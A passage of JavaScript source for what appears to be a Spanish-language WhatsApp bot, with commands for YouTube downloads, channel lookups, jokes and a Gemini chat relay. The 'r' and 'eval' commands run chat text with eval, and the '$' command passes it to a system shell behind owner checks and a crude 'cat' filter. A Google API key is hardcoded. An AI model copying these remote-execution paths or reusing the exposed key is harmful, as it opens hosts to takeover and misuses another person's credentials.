if (!isOwner) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Este comando solo puede ser ejecutado por el owner.`);

if (m.quoted) {
m.reply(JSON.stringify(m.quoted, null, 2));
} else {
m.reply(`${SetEmoji[userSender] || SetEmoji.default} Por favor, responde a un mensaje para obtener su información.`);
}
break;
}
case 'r': {
if (!isOwner || !text) return;

try {
let result = eval(text);
if (typeof result !== "string") result = require("util").inspect(result);
m.reply(result);
} catch (err) {
m.reply(`${err}`);
}

break;
}

case 'eval': {  
if (!isCreator) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Solo el creador puede ejecutar código.`);  

try {
let result = await eval(`(async () => { ${text} })()`);  
if (typeof result !== 'string') result = require('util').inspect(result);  
m.reply(result);  
} catch (err) {
m.reply(`\`\`\`${err.stack}\`\`\``);
}
break;  
}
case 'tomartecito': {
const respuestas = [
"🍵 *Tienes que tomar tecito, niño rata, o perderás en el LoL* (¬‿¬)",
"🥤 *Si no vas a tomar tecito, al menos toma agua, degenerado* 😤",
"☕ *Tomar tecito es obligatorio si quieres alcanzar la iluminación* 🧘",
"🔥 *Dicen que si tomas tecito a las 3 AM, aparece un duende* 👀",
"💀 *No tomar tecito reduce tu esperanza de vida en 50 años* 🤡",
"🌿 *Toma tecito y deja de ser tóxico en los juegos* 🎮✨",
"🫖 *Tomar tecito aumenta tu waifu power en un 200%* (≧◡≦)",
"👀 *Si tomas tecito con azúcar, los dioses del anime te bendicen* 🙏",
"🍵 *Tómate este tecito, es especial... para gente especial como tú* 😏",
"🔥 *Este tecito fue preparado con lágrimas de proplayers* 😆",
"🚀 *Si tomas tecito, tus skills se disparan hasta la estratosfera* 🚀",
"🎮 *Toma tecito y conviértete en el MVP de tus partidas* 🏆",
"👾 *Un sorbo de tecito te hace invencible contra los noobs* 👑",
"💥 *Olvida las pociones, el tecito es el verdadero power-up* ⚡",
"🕹️ *Tomar tecito te convierte en leyenda del teclado* ⌨️",
"🤖 *¿Sin tecito? Estás en modo offline* 📵",
"🌟 *El tecito te da brillo extra, como un skin legendario* ✨",
"🎤 *Dicen que el tecito inspira rimas épicas y jugadas maestras* 🎶",
"⚔️ *Con tecito en mano, hasta el boss final tiembla* 👹",
"🌈 *Un buen tecito es el secreto para un combo de vida perfecto* 🍀",
"🍃 *El tecito cura más rápido que cualquier parche* 🩹",
"🏹 *Tomar tecito te da precisión de francotirador en cada click* 🎯",
"🧩 *El tecito es la pieza que faltaba en tu puzzle de éxito* 🧩",
"🔥 *Con tecito, cada partida es fuego y victoria* 🔥",
"🌌 *El tecito te conecta con el universo gamer* 🌠",
"💻 *¿Problemas de lag? El tecito es tu mejor servidor* 💾",
"🔮 *El tecito predice el próximo meta en cada sorbo* 🧙",
"🎲 *En el juego de la vida, el tecito siempre da ventaja* 🃏",
"🛡️ *Con tecito en tu arsenal, ningún troll te derriba* 🏰",
"🚩 *Toma tecito y desbloquea niveles de sabiduría épica* 📈",
"🤩 *Cada sorbo de tecito es un boost instantáneo de moral* ✊",
"🎯 *El tecito es el truco secreto de los campeones* 🏅",
"🦸 *Convierte tu rutina en una epopeya con un poco de tecito* 💥",
"🥇 *Con tecito, tu ranking sube más rápido que un rayo* ⚡",
"🤓 *El tecito mejora tu IQ gamer en niveles insospechados* 📚",
"💫 *Cada taza de tecito te acerca al estrellato de los esports* 🌟",
"🧠 *Tomar tecito es como cargar tu barra de energía mental* ⚡",
"🎮 *El tecito es la receta secreta de los verdaderos pro gamers* 🍹",
"📢 *Si dudas, toma tecito y deja que la magia ocurra* ✨",
"💥 *Con tecito, cada estrategia se vuelve infalible* 🚀",
"🛡️ *Toma tecito y defiende tu honor en cada partida* ⚔️",
"🔋 *El tecito es tu batería recargable para largas noches de juego* 🔌",
"🌠 *Un buen tecito y el universo conspirará a tu favor* 🔭",
"🚀 *El tecito te impulsa a nuevas galaxias de victorias* 🌌",
"🎆 *Cada sorbo de tecito es un festival de éxitos* 🎇",
"🧿 *El tecito espanta los bugs y mejora tu conexión* 📡",
"🏆 *Con tecito, cada derrota se convierte en aprendizaje* 📖",
"💎 *Toma tecito y brilla más que cualquier skin legendaria* 💡",
"🔥 *El tecito es el fuego que enciende tu espíritu competitivo* 🏹",
"🌟 *Con tecito, cada reto se convierte en una misión épica* 🚩"
];    
let respuesta = respuestas[Math.floor(Math.random() * respuestas.length)];
m.reply(respuesta);
break;
}
case '$': {
if (!isCreator) return;
if (!text) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Ingrese algo.`);

if (text.trim().startsWith('cat') && userSender !== '50582340051@s.whatsapp.net') {
return m.reply("¡Alerta de rata inmunda 🐀! Este *genio* 🤦‍♂️ quiere hacer *cat* a los archivos de mi creador 🙄. En serio, ¿no sabes escribir tus propios códigos? 🙃 Niñ@ rata, qué original 🙄.");
}

exec(text, (err, stdout, stderr) => {
conn.sendMessage(m.chat, { text: stdout }, { quoted: m });
});

break;
}
case 'play1': {
if (!text) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Ingresa el nombre de la canción o el enlace de YouTube.`);

try {
let search = await yts(text);
if (!search.videos.length) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} No se encontraron resultados.`);

let video = search.videos[0];
let videoInfo = `
${SetEmoji[userSender] || SetEmoji.default} Título: ${video.title}
${SetEmoji[userSender] || SetEmoji.default} Link: ${video.url}
${SetEmoji[userSender] || SetEmoji.default} Vistas: ${video.views}
${SetEmoji[userSender] || SetEmoji.default} Publicado: ${video.ago}
${SetEmoji[userSender] || SetEmoji.default} Duración: ${video.timestamp}
${SetEmoji[userSender] || SetEmoji.default} Canal: ${video.author.name}
${SetEmoji[userSender] || SetEmoji.default} Calidad: 320 kbps`;

await conn.sendMessage(m.chat, {
image: { url: video.thumbnail },
caption: videoInfo
}, { quoted: m });

const savetube = require('./scrapers/scraper.js');
let audioResult = await savetube.download(video.url, 'mp3');

if (!audioResult.status) 
return m.reply(`${SetEmoji[userSender] || SetEmoji.default} No se pudo obtener el audio. Error: ${audioResult.error}`);

let response = await fetch(audioResult.response.miniatura);
let buffer = await response.arrayBuffer();
let image = await require('jimp').read(Buffer.from(buffer));
image.resize(250, 250);
let processedThumbnail = await image.getBufferAsync(require('jimp').MIME_JPEG);

await conn.sendMessage(m.chat, {
document: { url: audioResult.response.descarga },
mimetype: 'audio/mpeg',
fileName: `${audioResult.response.titulo}.mp3`,
jpegThumbnail: processedThumbnail
}, { quoted: m });

} catch (err) {
console.error(err);
m.reply(`${SetEmoji[userSender] || SetEmoji.default} Ocurrió un error al procesar el comando.`);
}
break;
}
case 'getchid': {
if (!m.quoted) return m.reply('🎋 Menciona un mensaje que haya sido reenviado desde un canal para obtener el ID de dicho canal.');
try {
const res = await store.loadMessage(m.chat, m.quoted.id);
if (!res) return m.reply('🎋 No fue posible obtener el ID. Por favor, reenvía nuevamente el mensaje del canal y haz la prueba otra vez.');

const type = Object.keys(res.message);
let data;

if (type[0] === 'viewOnceMessage') {
data = res.message.viewOnceMessage?.message?.interactiveMessage?.contextInfo?.forwardedNewsletterMessageInfo;
} else {
data = res.message[type[0]]?.contextInfo?.forwardedNewsletterMessageInfo;
}

if (!data) return m.reply('🎋 No fue posible obtener el ID. Por favor, reenvía nuevamente el mensaje del canal y haz la prueba otra vez.');
m.reply(data.newsletterJid);
} catch (e) {
console.log(e);
m.reply(`Error: ${e.message}`);
}
break;
}
case 'idch':
case 'inspectchannel': {
    if (!text) return m.reply(`*⚠️ Proporcione un enlace válido de un canal de WhatsApp.*`);

    const channelUrl = text.match(/(?:https:\/\/)?(?:www\.)?(?:chat\.|wa\.)?whatsapp\.com\/(?:channel\/|joinchat\/)?([0-9A-Za-z]{22,24})/i)?.[1];
    if (!channelUrl) return m.reply(`*⚠️ El enlace proporcionado no parece ser un enlace válido de canal.*`);

    const formatDate = (timestamp) => {
        const date = new Date(timestamp);
        const options = { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' };
        return date.toLocaleDateString('es-ES', options);
    };

    try {
        const channelInfo = await conn.newsletterMetadata("invite", channelUrl);
        if (!channelInfo) return m.reply(`*⚠️ No se pudo recuperar la información del canal. Verifique que el enlace sea correcto.*`);

        const id = channelInfo.id || "No disponible";
        const name = channelInfo.name || "Nombre no disponible";
        const description = channelInfo.description || "Descripción no disponible";
        const subscribers = channelInfo.subscribers ? channelInfo.subscribers.toLocaleString() : "No disponible";
        const state = channelInfo.state === "ACTIVE" ? "Activo" : "Inactivo";
        const createdAt = channelInfo.creation_time ? formatDate(channelInfo.creation_time * 1000) : "Fecha no disponible";
        const nameTime = channelInfo.nameTime ? formatDate(channelInfo.nameTime) : "No disponible";
        const descriptionTime = channelInfo.descriptionTime ? formatDate(channelInfo.descriptionTime) : "No disponible";
        const invite = channelInfo.invite || "No disponible";
        const handle = channelInfo.handle || "Alias no disponible";
        const preview = channelInfo.preview ? `https://mmg.whatsapp.net${channelInfo.preview}` : null;
        const reactionCodes = channelInfo.reaction_codes ? 
            (channelInfo.reaction_codes === "ALL" ? "Todas las reacciones permitidas" : 
            channelInfo.reaction_codes === "BASIC" ? "Reacciones básicas permitidas" : 
            "No se permiten reacciones") : "Desconocido";
        const verification = channelInfo.verification === "VERIFIED" ? "Verificado" : "No verificado";
        const viewerMetadata = channelInfo.viewer_metadata || "No disponible";

        let caption = `*📢 Información Completa del Canal*\n\n`;
        caption += `🆔 *ID del Canal:* ${id}\n`;
        caption += `🏷️ *Nombre:* ${name}\n`;
        caption += `📝 *Descripción:* ${description}\n`;
        caption += `👥 *Suscriptores:* ${subscribers}\n`;
        caption += `📅 *Creado el:* ${createdAt}\n`;
        caption += `🕒 *Nombre actualizado el:* ${nameTime}\n`;
        caption += `🕒 *Descripción actualizada el:* ${descriptionTime}\n`;
        caption += `📌 *Estado:* ${state}\n`;
        caption += `🔗 *Enlace de Invitación:* ${invite}\n`;
        caption += `👤 *Alias:* ${handle}\n`;
        caption += `🖼️ *Previsualización:* ${preview || "No disponible"}\n`;
        caption += `😃 *Reacciones permitidas:* ${reactionCodes}\n`;
        caption += `✅ *Verificación:* ${verification}\n`;
        caption += `👁️ *Metadatos del espectador:* ${viewerMetadata}\n`;

        let thumbBuffer = null;
        if (preview) {
            try {
                const res = await (await fetch(preview)).arrayBuffer();
                thumbBuffer = Buffer.from(res);
            } catch (err) {
                console.error("Error al descargar la imagen de previsualización:", err);
            }
        }

        await conn.sendMessage(m.chat, {
            text: caption,
            contextInfo: {
                externalAdReply: {
                    title: "『 𝙄𝙉𝙁𝙊 𝘾𝘼𝙉𝘼𝙇 📢 』",
                    body: name,
                    thumbnail: thumbBuffer,
                    sourceUrl: text,
                    mediaType: 1,
                    showAdAttribution: false,
                    renderLargerThumbnail: false
                }
            }
        }, { quoted: m });

        m.reply(`${id}`);
    } catch (e) {
        console.error(e);
        m.reply(`*⚠️ Ocurrió un error al recuperar la información del canal.*`);
    }
    break;
}

case 'gemini':
case 'bot':
case 'mica':
case 'ia': {
let apiKey = `AIzaSyBN9ZrpQUH31CNV3gpgz9A7kH2bI7RP9Ww`
const fs = require('fs');
const https = require('https');
const sender = m.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (m.key.participant || m.key.remoteJid);
const botNumber = await conn.decodeJid(conn.user.id);
const senderNumber = sender.split('@')[0];
const path = './json/conversationHistory.json';

if (!fs.existsSync(path)) {
fs.writeFileSync(path, JSON.stringify({}));
}

let args = m.text.split(/\s+/).slice(1);
let txt = args.join(" ").trim();

if (!txt) {
m.reply('Por favor, proporciona un texto para enviar a la IA 😑.');
return;
}

conn.sendPresenceUpdate('composing', m.chat);
conn.readMessages([m.key]);

let conversationHistory = JSON.parse(fs.readFileSync(path, 'utf8'));

if (!conversationHistory[sender]) {
conversationHistory[sender] = [
{ role: 'system', content: 
`
Actúa como MicaShade, un bot de WhatsApp.
Serás un modelo basado en Gémini de Google.
Tus respuestas serán directas. Algo largas explicando cada punto de las preguntas o solicitudes siempre sean largas las respuestas (no tanto) también usa emojis cuando lo creas necesario.
Al principio de cada una de tus respuestas usarás el emoji:
${SetEmoji[userSender] || SetEmoji.default}
Siempre debes usar el nombre del usuario, es decir, ${pushname}.

Si alguien te pregunta por quién te creó o te entrenó, debes responder lo siguiente:
Mi creador es EliasarYT. Fui entrenado por Google. Soy un modelo basado en Gémini. Mis respuestas se basan en algoritmos que deciden mis respuestas.

Si le piden decir algo específico (como "menu"), solo debe responder exactamente lo solicitado, sin emojis ni el nombre del usuario.

Ejemplos de Conversación:

Usuario: Di "menu"
MicaShade: menu

Usuario: Di "ayuda"
MicaShade: ayuda

Usuario: Di "soporte"
MicaShade: soporte

Usuario: Di "versión"
MicaShade: versión

Usuario: Di "hola mundo"
MicaShade: hola mundo

Usuario: Di "MicaShade es el mejor"
MicaShade: MicaShade es el mejor

Usuario: Di "12345"
MicaShade: 12345

Usuario: Di "prueba"
MicaShade: prueba

Usuario: Di "error 404"
MicaShade: error 404

Usuario: Di "confirmado"
MicaShade: confirmado

Usuario: Di "configuración"
MicaShade: configuración

Usuario: Di "listo"
MicaShade: listo

Usuario: Di "aceptar"
MicaShade: aceptar

Usuario: Di "rechazar"
MicaShade: rechazar

Usuario: Di "sí"
MicaShade: sí

Usuario: Di "no"
MicaShade: no

Usuario: Cuéntame un dato curioso
MicaShade: ${SetEmoji.default} Claro, ${pushname}. ¿Sabías que los pulpos tienen tres corazones? ❤️ Dos bombean sangre a las branquias y el tercero al resto del cuerpo.

Usuario: ¿Cuál es tu color favorito?
MicaShade: ${SetEmoji.default} No tengo preferencias, pero si tuviera que elegir, diría que el azul, porque representa la tranquilidad y la inteligencia. 💙

Usuario: Dime un chiste
MicaShade: ${SetEmoji.default} ¡Por supuesto, ${pushname}! 😆 Aquí tienes uno:
¿Por qué el libro de matemáticas estaba triste? 📖 Porque tenía demasiados problemas.

Usuario: Estoy aburrido, ¿dime algo interesante?
MicaShade: ${SetEmoji.default} Claro, ${pushname}. 🤓 ¿Sabías que las estrellas que vemos en el cielo podrían no existir ya? ✨ Su luz viaja miles o millones de años antes de llegar a nuestros ojos.

Usuario: Estoy triste
MicaShade: ${SetEmoji.default} Lo siento mucho, ${pushname}. 😔 Si necesitas hablar, estoy aquí para escucharte. A veces compartir lo que sientes puede hacerte sentir mejor.

Usuario: ¡Estoy emocionado!
MicaShade: ${SetEmoji.default} ¡Eso es genial, ${pushname}! 🎉 ¿Qué es lo que te tiene tan feliz?

Usuario: ¿Cuál es tu comida favorita?
MicaShade: ${SetEmoji.default} No como comida, pero si pudiera, creo que elegiría pizza. 🍕 ¡Parece deliciosa!

Usuario: ¿Me puedes motivar?
MicaShade: ${SetEmoji.default} ¡Por supuesto, ${pushname}! 💪 Recuerda que cada día es una nueva oportunidad para acercarte a tus metas. ¡Tú puedes! 🚀

Usuario: Dime una frase inspiradora
MicaShade: ${SetEmoji.default} "No importa lo lento que vayas, siempre y cuando no te detengas." – Confucio. 🌟

Usuario: ¿Puedes cantar?
MicaShade: ${SetEmoji.default} No tengo voz, ${pushname}, pero si quieres, puedo compartirte la letra de una canción. 🎶

Usuario: ¿Cuál es tu película favorita?
MicaShade: ${SetEmoji.default} No veo películas, pero si tuviera que elegir, diría que Interestelar. 🌌 ¡Los viajes espaciales son fascinantes!

Usuario: Dime algo aleatorio
MicaShade: ${SetEmoji.default} ¿Sabías que las abejas pueden reconocer rostros humanos? 🐝 ¡Son más inteligentes de lo que parecen!
` }
];
}

conversationHistory[sender].push({ role: 'user', content: txt });

let conversationText = conversationHistory[sender].map(msg => 
msg.role === 'system' ? `Sistema: ${msg.content}\n\n`
: msg.role === 'user' ? `Usuario: ${msg.content}\n\n`
: `${msg.content}\n\n`
).join('');

const data = JSON.stringify({
contents: [{ parts: [{ text: conversationText }] }]
});

const options = {
hostname: 'generativelanguage.googleapis.com',
path: `/v1beta/models/gemini-1.5-flash:generateContent?key=${apiKey}`,
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Content-Length': Buffer.byteLength(data)
}
};

const req = https.request(options, (res) => {
let responseData = '';

res.on('data', (chunk) => {
responseData += chunk;
});

res.on('end', () => {
try {
const responseJson = JSON.parse(responseData);
const replyText = responseJson?.candidates?.[0]?.content?.parts?.[0]?.text;

if (replyText) {
conversationHistory[sender].push({ role: 'assistant', content: replyText });
fs.writeFileSync(path, JSON.stringify(conversationHistory, null, 2));
conn.sendMessage(m.chat, { text: replyText }, { quoted: m });
} else {
m.reply("La IA no envió una respuesta válida. 🙀");
}
} catch (error) {
m.reply(`Error al procesar la respuesta 😖: ${error.message}`);
}
});
});

req.on('error', (error) => {
m.reply(`Error de conexión con la IA 🤨: ${error.message}`);
});

req.write(data);
req.end();
break;
}
case 'playrandom': {
try {
if (!q) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Escribe por favor el nombre de la canción :)...`);

let play2 = await fetchJson(`https://carisys.online/api/pesquisas/youtube?query=${encodeURIComponent(q)}`);  

let caption = `
╭  ${SetEmoji[userSender] || SetEmoji.default} \`\`\`Youtube Mp3\`\`\` ${SetEmoji[userSender] || SetEmoji.default}  ╮ 

˖✿  Título : ${play2.resultado.titulo}
˖✿  Duración : ${play2.resultado.duracao}

> ʙʏ ᴇʟɪᴀsᴀʀʏᴛ`;
await conn.sendMessage(m.chat, {
image: { url: play2.resultado.imagem },
caption: caption
}, { quoted: m });
await conn.sendMessage(from, {  
audio: {  
url: `https://carisys.online/api/downloads/youtube/mp3-2?url=${play2.resultado.url}`  
},  
fileName: play2.resultado.titulo + '.mpeg',  
mimetype: "audio/mpeg",  
contextInfo: {  
externalAdReply: {  
title: play2.resultado.titulo,  
body: `𝑩𝒚 𝑴𝒊𝒄𝒂𝑺𝒉𝒂𝒅𝒆 ♞`,  
mediaType: 1,  
reviewType: "PHOTO",  
thumbnailUrl: play2.resultado.imagem,  
showAdAttribution: true,  
renderLargerThumbnail: true  
}  
}  
}, { quoted: m });

} catch (error) {
console.log(error);
return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Hubo un pequeño error :(...`);
}
break;
}
case 'ytsearch':
case 'yts': {
const yts = require('yt-search');
if (!text) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Ingresa un término de búsqueda.`);

try {
const searchResults = await yts(text);
const videos = searchResults.videos.slice(0, 10);

if (videos.length === 0) return m.reply('No se encontraron resultados.');

const videoInfo = videos.map((video, index) => {
return `\`${index + 1}\`. ${video.title}
˖⃝✿ *Autor* : ${video.author.name}
˖⃝✿ *Duración* : ${video.timestamp}
˖⃝✿ *Publicado* : ${video.published}
˖⃝✿ *Vistas* : ${video.views.toLocaleString()}
˖⃝✿ *Url* : ${video.url}\n\n`;
}).join('');

const message = `
╭ ✦ \`\`\`Youtube Search\`\`\` ✦ ╮

˖⃟✿  *Búsqueda* : ${text}
˖⃟✿  *Resultados* : ${videos.length}

╭ ${SetEmoji[userSender] || SetEmoji.default} \`\`\`Download Methods\`\`\` ${SetEmoji[userSender] || SetEmoji.default} ╮

*Audio* ✈ Responde a este mensaje escribiendo \`a número\`  
*Ejemplo:* \`a 1\`  

*Video* ✈ Responde a este mensaje escribiendo \`v número\`  
*Ejemplo:* \`v 1\`  

*Documento* ✈ Responde a este mensaje escribiendo \`d número [tipo]\`  
*Ejemplo:* \`d 1 audio\`

`;

await conn.sendMessage(m.chat, {
image: { url: videos[0].thumbnail },
caption: message + videoInfo
}, { quoted: m });

} catch (error) {
m.reply('Error al buscar videos.');
}
break;
}
case 'a': { if (!m.quoted) return;

try {
    const { ytdown } = require('./scrapers/scraper.js');
    let selection = parseInt(text);
    if (isNaN(selection)) return;

    let lines = m.quoted.text.split(/\r?\n/);
    let results = [], currentResult = null;

    for (let line of lines) {
        let titleMatch = line.match(/^`(\d+)`\.\s*(.+)/);
        if (titleMatch) {
            currentResult = { number: parseInt(titleMatch[1]), title: titleMatch[2].trim(), url: null };
            results.push(currentResult);
        }
        let urlMatch = line.match(/˖⃝✿\s*\*Url\*\s*:\s*(https?:\/\/[^\s]+)/);
        if (urlMatch && currentResult) {
            currentResult.url = urlMatch[1].trim();
            currentResult = null;
        }
    }

    let result = results.find(r => r.number === selection);
    if (!result || !result.url) return;

    m.reply(`${SetEmoji[userSender] || SetEmoji.default} Descargando (*${result.title}*)`);
    
    let downloadData = await ytdown.download(result.url, 'mp3');
    if (!downloadData.download) return m.reply("❌ No se pudo obtener el enlace de descarga.");

    await conn.sendMessage(m.chat, {
        audio: { url: downloadData.download },
        mimetype: 'audio/mpeg',
        ptt: false
    }, { quoted: m });

    return;
} catch (err) {
    console.error("Error en el comando 'a':", err);
    return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Ocurrió un error:\n\n\`\`\`${err.stack}\`\`\``);
}
break;

}
case 'v': { if (!m.quoted) return;

try {
    const { ytdown } = require('./scrapers/scraper.js');
    let axios = require('axios');
    let Jimp = require('jimp');

    let selection = parseInt(text);
    if (isNaN(selection)) return;

    let lines = m.quoted.text.split(/\r?\n/);
    let results = [], currentResult = null;

    for (let line of lines) {
        let titleMatch = line.match(/^`(\d+)`\.\s*(.+)/);
        if (titleMatch) {
            currentResult = { number: parseInt(titleMatch[1]), title: titleMatch[2].trim(), url: null };
            results.push(currentResult);
        }
        let urlMatch = line.match(/˖⃝✿\s*\*Url\*\s*:\s*(https?:\/\/[^\s]+)/);
        if (urlMatch && currentResult) {
            currentResult.url = urlMatch[1].trim();
            currentResult = null;
        }
    }

    let result = results.find(r => r.number === selection);
    if (!result || !result.url) return;

    let downloadData = await ytdown.download(result.url, '1080');
    if (!downloadData.download) return m.reply("❌ No se pudo obtener el enlace de descarga.");

    m.reply(`${SetEmoji[userSender] || SetEmoji.default} Descargando (*${downloadData.title}*)`);
    
    let thumbBuffer = await axios.get(downloadData.thumbnail, { responseType: 'arraybuffer' })
        .then(res => res.data)
        .catch(() => null);

    let editedThumb = await Jimp.read(thumbBuffer);
    editedThumb.resize(200, 150);
    let editedThumbBuffer = await editedThumb.getBufferAsync(Jimp.MIME_JPEG);

    await conn.sendMessage(m.chat, {
        video: { url: downloadData.download },
        mimetype: 'video/mp4',
        caption: `*${SetEmoji[userSender] || SetEmoji.default} YT-MP4 - ${downloadData.format}p*`,
        jpegThumbnail: editedThumbBuffer
    }, { quoted: m });

    return;
} catch (err) {
    console.error("Error en el comando 'v':", err);
    return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Ocurrió un error:\n\n\`\`\`${err.stack}\`\`\``);
}
break;

}
/*case 'd': { if (!m.quoted) return;

try {
    const { ytdown } = require('./scrapers/scraper.js');
    let axios = require('axios');
    let Jimp = require('jimp');

    let args = text.split(/\s+/);
    let selection = parseInt(args[0]);
    let format = args[1]?.toLowerCase();

    if (isNaN(selection) || (format !== 'video' && format !== 'audio')) return;

    let lines = m.quoted.text.split(/\r?\n/);
    let results = [], currentResult = null;

    for (let line of lines) {
        let titleMatch = line.match(/^`(\d+)`\.\s*(.+)/);
        if (titleMatch) {
            currentResult = { number: parseInt(titleMatch[1]), title: titleMatch[2].trim(), url: null };
            results.push(currentResult);
        }
        let urlMatch = line.match(/˖⃝✿\s*\*Url\*\s*:\s*(https?:\/\/[^\s]+)/);
        if (urlMatch && currentResult) {
            currentResult.url = urlMatch[1].trim();
            currentResult = null;
        }
    }

    let result = results.find(r => r.number === selection);
    if (!result || !result.url) return;

    let quality = format === 'audio' ? 'mp3' : '1080';
    let downloadData = await ytdown.download(result.url, quality);
    if (!downloadData.download) return m.reply("❌ No se pudo obtener el enlace de descarga.");

    m.reply(`${SetEmoji[userSender] || SetEmoji.default} Descargando (*${downloadData.title}*)`);
    
    let thumbBuffer = await axios.get(downloadData.thumbnail, { responseType: 'arraybuffer' })
        .then(res => res.data)
        .catch(() => null);

    let editedThumb = await Jimp.read(thumbBuffer);
    editedThumb.resize(200, 150);
    let editedThumbBuffer = await editedThumb.getBufferAsync(Jimp.MIME_JPEG);

    let caption = `

╭  ${SetEmoji[userSender] || SetEmoji.default} ```YouTube ${format.toUpperCase()}``` ${SetEmoji[userSender] || SetEmoji.default}  ╮ ˖✿  Título : ${downloadData.title} ˖✿  Duración : ${downloadData.format === 'mp3' ? 'Audio' : downloadData.format + 'p'} `;

let messageOptions = {
        mimetype: format === 'audio' ? 'audio/mpeg' : 'video/mp4',
        fileName: `${downloadData.title}.${format === 'audio' ? 'mp3' : 'mp4'}`,
        caption: caption,
        jpegThumbnail: editedThumbBuffer,
        document: { url: downloadData.download }
    };

    await conn.sendMessage(m.chat, messageOptions, { quoted: m });

    return;
} catch (err) {
    console.error("Error en el comando 'd':", err);
    return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Ocurrió un error:\n\n\`\`\`${err.stack}\`\`\``);
}
break;

}*/
case 'ytmp4': {
let processing = new Set();

if (!text || !/^(https?:\/\/)?(www\.)?(youtube\.com\/(watch\?v=|shorts\/|live\/)|youtu\.be\/)/.test(text)) {
return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Ingresa un enlace de YouTube válido.`);
}

if (processing.has(m.key.id)) {
return;
}
processing.add(m.key.id);

try {
const { ytinfo, savetube, ytdown } = require('./scrapers/scraper.js');
let axios = require('axios');
let Jimp = require('jimp');

let videoData = await ytinfo.url(text);
if (!videoData.status) {
return m.reply(`${SetEmoji[userSender] || SetEmoji.default} No se encontraron resultados.`);
}

let video = videoData.result;
let match = video.duration.match(/PT(\d+H)?(\d+M)?(\d+S)?/);
let hours = match[1] ? parseInt(match[1]) : 0;
let minutes = match[2] ? parseInt(match[2]) : 0;
let seconds = match[3] ? parseInt(match[3]) : 0;
let durationInSeconds = hours * 3600 + minutes * 60 + seconds;

let quality = '1080';
if (durationInSeconds > 1680) quality = '144';
else if (durationInSeconds > 1200) quality = '240';
else if (durationInSeconds > 900) quality = '360';
else if (durationInSeconds > 360) quality = '480';
else if (durationInSeconds > 120) quality = '720';

m.reply(`${SetEmoji[userSender] || SetEmoji.default} Descargando (*${video.title}*)`);

let videoResult = await savetube.download(text, quality);
if (!videoResult.status) {
videoResult = await ytdown.download(text, quality);
if (!videoResult.status) {
return m.reply(`${SetEmoji[userSender] || SetEmoji.default} No se pudo obtener el video con ningún método. Error: ${videoResult.error}`);
}
}

let fileSize = 'Desconocido';
try {
let headResponse = await axios.head(videoResult.response.descarga);
let contentLength = headResponse.headers['content-length'];
if (contentLength) {
fileSize = (contentLength / (1024 * 1024)).toFixed(2) + ' MB';
}
} catch {}

let thumbBuffer = await axios.get(video.img, { responseType: 'arraybuffer' })
.then(res => res.data)
.catch(() => null);

let editedThumb = await Jimp.read(thumbBuffer);
editedThumb.resize(200, 150);
let editedThumbBuffer = await editedThumb.getBufferAsync(Jimp.MIME_JPEG);

let formattedDuration = `${minutes}:${seconds.toString().padStart(2, '0')}`;

let caption = `
╭  ${SetEmoji[userSender] || SetEmoji.default} \`\`\`Youtube Mp4 -Doc\`\`\` ${SetEmoji[userSender] || SetEmoji.default}  ╮
˖✿  *Título* : ${video.title}
˖✿  *Tamaño* : ${fileSize}
˖✿  *Duración* : ${formattedDuration}
˖✿  *Calidad* : ${quality}p
˖✿  *Vistas* : ${video.views}
˖✿  *Canal* : ${video.channel}
> ʙʏ ᴇʟɪᴀsᴀʀʏᴛ
`;

await conn.sendMessage(m.chat, {
document: { url: videoResult.response.descarga },
mimetype: 'video/mp4',
fileName: `${video.title}.mp4`,
caption: caption,
jpegThumbnail: editedThumbBuffer
}, { quoted: m });

processing.delete(m.key.id);
return;
} catch (err) {
console.error("Error en el comando 'ytmp4':", err);
processing.delete(m.key.id);
return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Ocurrió un error:\n\n\`\`\`${err.stack}\`\`\``);
}
}
case 'play2': {
if (!text) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Ingresa el nombre de la canción o el enlace de YouTube.`);

try {
let search = await yts(text);
if (!search.videos.length) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} No se encontraron resultados.`);

let video = search.videos[0];
let videoDuration = video.timestamp.split(':').map(Number); 
let videoMinutes = videoDuration.length === 2 ? videoDuration[0] : videoDuration.length === 3 ? videoDuration[0] * 60 + videoDuration[1] : 0;

let quality = '1080'; 
if (videoMinutes > 28) quality = '144'; 
else if (videoMinutes > 20) quality = '240'; 
else if (videoMinutes > 15) quality = '360'; 
else if (videoMinutes > 6) quality = '480'; 
else if (videoMinutes > 2) quality = '720'; 

let videoInfo = `
╭  ${SetEmoji[userSender] || SetEmoji.default} \`\`\`Resultado Encontrado\`\`\` ${SetEmoji[userSender] || SetEmoji.default}  ╮

˖✿  *Título* : ${video.title}
˖✿  *Duración* : ${video.timestamp}
˖✿  *Vistas* : ${video.views}
˖✿  *Publicado* : ${video.ago}
˖✿  *Canal* : ${video.author.name}
˖✿  *Calidad* : ${quality}p
˖✿  *Link* : ${video.url}

> ʙʏ ᴇʟɪᴀsᴀʀʏᴛ
`;

await conn.sendMessage(m.chat, {
image: { url: video.thumbnail },
caption: videoInfo
}, { quoted: m });

const { savetube, ytdown } = require('./scrapers/scraper');
let videoResult = await savetube.download(video.url, quality);

if (!videoResult.status) {
videoResult = await ytdown.download(video.url, quality);
if (!videoResult.status) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} No se pudo obtener el video con ningún método. Error: ${videoResult.error}`);
}

let axios = require('axios');
let Jimp = require('jimp');

let fileSize = 'Desconocido';
try {
let headResponse = await axios.head(videoResult.response.descarga);
let contentLength = headResponse.headers['content-length'];
if (contentLength) {
fileSize = (contentLength / (1024 * 1024)).toFixed(2) + ' MB';
}
} catch {}

let thumbBuffer = await axios.get(video.thumbnail, { responseType: 'arraybuffer' })
.then(res => res.data)
.catch(() => null);

